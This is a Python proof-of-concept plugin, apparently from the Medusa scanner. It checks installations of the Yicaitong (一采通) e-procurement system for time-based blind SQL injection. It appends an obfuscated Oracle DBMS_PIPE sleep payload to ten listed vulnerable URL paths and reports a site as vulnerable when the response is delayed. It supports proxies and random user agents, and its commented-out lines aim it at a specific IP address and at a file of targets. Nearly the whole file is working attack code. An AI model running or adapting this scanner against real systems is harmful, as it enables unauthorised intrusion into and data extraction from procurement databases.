#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 一采通电子采购系统多处时间盲注
referer: http://wooyun.org/bugs/wooyun-2010-0117552
         http://wooyun.org/bugs/wooyun-2010-0117795
         http://wooyun.org/bugs/wooyun-2010-0117552
         http://wooyun.org/bugs/wooyun-2010-0117545
         http://wooyun.org/bugs/wooyun-2010-079420
         http://wooyun.org/bugs/wooyun-2010-062918
author: Ascotbe
reference: Lucifer
description: 一采通多处时间盲注。
'''

import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


urls = ["/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1",
        "/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1",
        "/Price/SuggestList.aspx?priceid=1",
        "/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1",
        "/Products/Category/CategoryOption.aspx?option=IsStop&classId=1",
        "/custom/CompanyCGList.aspx?ComId=1",
        "/SuperMarket/InterestInfoDetail.aspx?ItemId=1",
        "/Orders/k3orderdetail.aspx?FINTERID=1",
        "/custom/CompanyCGList.aspx?ComId=1",
        "/custom/GroupNewsList.aspx?child=true&groupId=121"]
payload = "%20AnD%206371=DbMs_PiPe.ReCeIvE_MeSsAgE(11,6)"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for turl in urls:
            #s = requests.session()
            payload_url = scheme + "://" + url + turl + payload
            start_time = time.time()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if time.time() - start_time >= 6:
                Medusa = "{} 存在一采通电子采购系统时间盲注漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')